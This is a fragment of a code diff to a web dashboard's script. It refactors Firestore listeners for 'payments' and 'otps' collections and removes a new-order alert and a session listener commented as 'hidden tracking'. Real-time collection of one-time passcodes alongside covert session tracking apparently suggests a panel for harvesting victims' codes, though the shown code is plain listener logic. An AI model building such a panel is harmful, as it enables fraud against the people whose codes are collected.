-                    changed = true;
+                    paymentsMap.delete(change.doc.id);
+                } else {
+                    paymentsMap.set(change.doc.id, { ...change.doc.data(), id: change.doc.id });
                 }
             });
-            if (changed) {
-                renderFeed();
-                renderGroupedOTPs();
-            }
-        });
+            rebuildDistribution();
+        }, err => console.error("payments listener:", err));
 
-        // OTPs collection
         db.collection("otps").onSnapshot((snapshot) => {
-            let changed = false;
             snapshot.docChanges().forEach((change) => {
-                const data = { ...change.doc.data(), id: change.doc.id, type: 'otps' };
-                if (change.type === "added" || change.type === "modified") {
-                    unifiedData.set(data.id, data);
-                    if (change.type === "added" && !initialLoad) {
-                        playSound('newOrder'); showToast('جالك طلب جديد حيّ الله بالنشامى!');
-                    }
-                    changed = true;
-                }
                 if (change.type === "removed") {
-                    unifiedData.delete(data.id);
-                    changed = true;
+                    otpsMap.delete(change.doc.id);
+                } else {
+                    otpsMap.set(change.doc.id, { ...change.doc.data(), id: change.doc.id });
                 }
             });
-            if (changed) {
-                renderFeed();
-                renderGroupedOTPs();
-            }
-
-            setTimeout(() => { initialLoad = false; }, 2000);
-        });
-
-        // Sessions collection (hidden tracking)
-        db.collection("sessions").onSnapshot((snapshot) => {
-            let changed = false;
-            snapshot.docChanges().forEach((change) => {
-                const data = { ...change.doc.data(), id: change.doc.id };
-                if (change.type === "added" || change.type === "modified") {
-                    sessionsData.set(data.id, data);
-                    changed = true;
-                }
-                if (change.type === "removed") {
-                    sessionsData.delete(data.id);
-                    changed = true;
-                }
-            });
-            if (changed) renderSessions();
-        });
-
-        // Re-render sessions every 30 seconds (to update "last seen" times)
-        setInterval(() => {
-            if (currentMode === 'supervisor' && sessionsData.size > 0) {
-                renderSessions();
-            }
-        }, 30000);
+            rebuildDistribution();
+        }, err => console.error("otps listener:", err));
     </script>
 </body>
 </html>
